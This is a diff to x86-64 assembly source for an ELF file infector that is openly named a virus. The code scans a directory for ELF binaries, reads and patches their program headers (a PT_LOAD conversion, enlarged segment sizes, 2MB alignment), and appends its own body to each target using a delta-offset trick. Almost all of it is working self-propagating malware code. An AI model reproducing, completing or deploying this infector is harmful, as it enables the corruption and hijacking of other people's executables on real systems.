@@ -63,7 +63,7 @@
 ; 	🐴 r15 + 1404 = phdr.memsz                      Size of the segment in memory (may include padding).
 ; 	🦄 r15 + 1412 = phdr.align                      Alignment of the segment in memory and file
 
-; r15 + 1420 binary_fd                              Actual reading file descriptor
+; r15 + 1420 target binary_fd                       Actual reading file descriptor
 
 ; r15 + 1424 Phdr64
 ;	r15 + 1424    phdr.p_type                       Type of segment (e.g., PT_LOAD, PT_DYNAMIC).
@@ -76,8 +76,10 @@
 ;	r15 + 1472    phdr.p_align                      Alignment of the segment in memory and file.
 
 ; r15 + 1484                                        phdr_num counter to iterate over the headers
-
+; r15 + 1492										current phdr offset
 ; r15 + 1500                                        binary to infect size
+
+; r15 + 1508                                        entry dpuente
 
 global _start
 
@@ -195,6 +197,9 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 		cmp dword [r15 + 1300], 0x464c457f         ; check if the file starts with 177ELF what indicates it is an ELF binary
 		jne _close_bin
 
+	_save_entry_dpuente:
+		mov r9, [r15 + 1324]
+		mov [r15 + 1508], r9
 
 		mov byte [r15 + 1484], 0                   ; i = 0, iterate over all ELF program headers
 		_read_phdr:
@@ -207,6 +212,9 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			mov r10, [r15 + 1484]
 			imul r10, r10, PHDR_SIZE
 			add r10, EHDR_SIZE
+
+			mov qword [r15 + 1492], r10
+
 			mov rax, SYS_PREAD64
 			syscall
 
@@ -225,9 +233,10 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 		 	mov [r15 + 1440], r9				   ; patch phdr.vaddr
 
 
-		_patch_segment_size:
-			add qword [r15 + 1456], _stop - _start + 5;
-			add qword [r15 + 1464], _stop - _start + 5;
+		_patch_segment_size:                       ; adding the length of the program to the section size as well as to section memory
+			add qword [r15 + 1456], _stop - _start + 5
+			add qword [r15 + 1464], _stop - _start + 5
+			mov qword [r15 + 1472], 0x200000       ; patch phdr.align to 2MB
 
 		_point_offset_to_converted_segment:
 			mov rax, SYS_LSEEK
@@ -236,14 +245,31 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			mov rdx, SEEK_END
 			syscall
  
-			mov [r15 + 1432], rax
+			mov [r15 + 1432], rax                  ; PT_LOAD starts at the end of the target bin to execute our code
+			; push rax
 
+			call .delta
+			.delta:
+				pop rbp
+				sub rbp, .delta
+
+
+		_append_virus:
+			; pwrite(fd, buff, count, offset)
+			mov rdi, [r15 + 1420]
+			lea rsi, [rbp + _start]
+			mov rdx, _stop - _start
+			mov r10, rax                     ; end of target to start appending
+			mov rax, SYS_PWRITE64
+			syscall
 
 		_write_header_changes_to_bin:              ; writes new header modifications to the binary
 			mov rdi, [r15 + 1420]
 			lea rsi, [r15 + 1424]
 			mov rdx, PHDR_SIZE
-			; mov r10, r10 ????????
+			; pop rax
+			; mov [r15 + 1432], rax                  ; PT_LOAD starts at the end of the target bin to execute our code
+			mov qword r10, [r15 + 1492]
 			mov rax, SYS_PWRITE64
 			syscall
 
